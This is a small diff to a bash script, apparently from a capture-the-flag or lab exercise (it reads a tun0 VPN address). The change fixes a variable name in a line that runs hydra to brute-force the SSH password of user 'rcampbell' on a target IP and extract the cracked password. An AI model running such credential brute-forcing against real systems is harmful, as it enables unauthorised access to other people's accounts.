@@ -23,7 +23,7 @@ if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ] || [ -z "$Wordli
   exit 1
 fi
 
-pass=$(hydra -l rcampbell -P "$WORDLIST" ssh://"$IP" -t 64 | grep -oP "password: \K.*")
+pass=$(hydra -l rcampbell -P "$Wordlist" ssh://"$IP" -t 64 | grep -oP "password: \K.*")
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
